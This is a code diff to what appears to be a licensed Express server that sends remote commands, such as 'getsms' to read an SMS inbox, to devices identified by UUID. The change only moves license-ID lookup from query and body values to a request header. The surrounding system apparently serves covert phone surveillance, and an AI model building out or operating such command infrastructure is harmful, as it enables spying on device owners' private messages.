@@ -2293,7 +2293,8 @@ app.use((req, res, next) => {
 
 app.get("/devices", async (req, res) => {
   logger.log(`📥 GET /devices - Request received`);
-  const licenseId = req.query.licenseId || req.headers['x-license-id'];
+  // SECURITY: Prioritize header over query param (header is not visible in network tab)
+  const licenseId = req.headers['x-license-id'] || req.query.licenseId;
   
   // STRICT: License ID is REQUIRED - no fallback
   if (!licenseId) {
@@ -2566,7 +2567,9 @@ function validateCommand(cmd, param) {
 // -------------------- Send Command via REST API --------------------
 app.post("/api/command/:uuid", async (req, res) => {
   const uuid = req.params.uuid;
-  const { cmd, param, licenseId } = req.body; // cmd like "getsms", param like "inbox|50|10", licenseId for validation
+  const { cmd, param } = req.body; // cmd like "getsms", param like "inbox|50|10"
+  // SECURITY: License ID from header (preferred) or body (backward compatibility)
+  const licenseId = req.headers['x-license-id'] || req.body.licenseId;
 
   logger.log(`📥 POST /api/command/${uuid} received`);
   logger.log(`   Body:`, req.body);
